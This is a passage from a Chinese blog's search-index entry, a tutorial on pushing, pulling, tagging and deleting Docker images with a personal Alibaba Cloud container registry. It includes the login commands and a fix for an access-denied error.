src="/images/%E9%98%BF%E9%87%8C%E4%BA%91%E9%95%9C%E5%83%8F%E6%9C%8D%E5%8A%A1.assets/image-20250213223419561.png" alt="image-20250213223419561"></p><p>此时生成新的，需要删除旧的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi crpi-oep0r0ys6k2kecir.cn-guangzhou.personal.cr.aliyuncs.com/netimages/redis:7.4.1</span><br></pre></td></tr></table></figure><p><img src="/images/%E9%98%BF%E9%87%8C%E4%BA%91%E9%95%9C%E5%83%8F%E6%9C%8D%E5%8A%A1.assets/image-20250213223552555.png" alt="image-20250213223552555"></p><h1 id="公开则不需要认证"><a href="#公开则不需要认证" class="headerlink" title="公开则不需要认证"></a>公开则不需要认证</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull crpi-oep0r0ys6k2kecir.cn-guangzhou.personal.cr.aliyuncs.com</span><br></pre></td></tr></table></figure><p>ALIYUN_REGISTRY_PASSWORD&#x3D;Aliyunxxxxxxxxx</p><h1 id="上传push到阿里云"><a href="#上传push到阿里云" class="headerlink" title="上传push到阿里云"></a>上传push到阿里云</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker login --username=r_r_r_r crpi-oep0r0ys6k2kecir.cn-guangzhou.personal.cr.aliyuncs.com</span><br><span class="line"></span><br><span class="line">docker tag d2fa7cd1de2b crpi-oep0r0ys6k2kecir.cn-guangzhou.personal.cr.aliyuncs.com/netimages/java:21</span><br><span class="line"></span><br><span class="line">docker push crpi-oep0r0ys6k2kecir.cn-guangzhou.personal.cr.aliyuncs.com/netimages/java:21</span><br></pre></td></tr></table></figure><h3 id="需要确保阿里云实例命名空间开启"><a href="#需要确保阿里云实例命名空间开启" class="headerlink" title="需要确保阿里云实例命名空间开启"></a>需要确保阿里云实例命名空间开启</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">报错：</span><br><span class="line">denied: requested access to the resource is denied</span><br></pre></td></tr></table></figure><p><img src="/images/%E9%98%BF%E9%87%8C%E4%BA%91%E9%95%9C%E5%83%8F%E6%9C%8D%E5%8A%A1.assets/image-20250215224640359.png" alt="image-20250215224640359"></p>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> 阿里云 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
